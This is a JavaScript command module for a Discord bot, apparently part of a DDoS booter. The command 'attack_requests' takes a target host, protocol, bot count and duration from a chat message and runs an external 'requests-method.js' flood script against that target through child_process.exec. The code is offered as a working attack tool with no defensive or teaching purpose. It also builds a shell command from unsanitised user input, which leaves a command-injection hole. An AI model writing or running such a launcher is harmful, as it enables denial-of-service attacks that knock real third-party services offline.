const Discord = require("discord.js");

exports.run = async (client, message, args) => {

    const host = message.content.split(" ")[1];
    const protocol = message.content.split(" ")[2];
    const botcount = message.content.split(" ")[3];
    const time = message.content.split(" ")[4];
    const ayarlar = require('../ayarlar.json');
    var room = ayarlar.commandroom;
    const roleName = message.member.roles.cache.find(r => r.name === "[attack-plan]");

    if (message.channel.id != room) {
        return;
    }

    if (!args[0] || !args[1] || !args[2]) {
        return;
    }

    if (roleName) {
        return;
    }

    setTimeout(() => {
        var exec = require('child_process').exec;
        exec(`node requests-method.js --ip ${host} --bps ${botcount} --time ${time} --protocol ${protocol} --method Requests`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing attack: ${error}`);
            }
        });

        console.log('Launched Attack By ID:' + message.guild.id);
    }, 5000); // Wait for 5 seconds before executing the attack
};

exports.conf = {
    enabled: true,
    guildOnly: false,
    aliases: ['attack_requests'],
    permLevel: 0
};

exports.help = {
    name: 'attack_requests',
    description: 'requests methods ddos',
    usage: 'attack_requests'
};
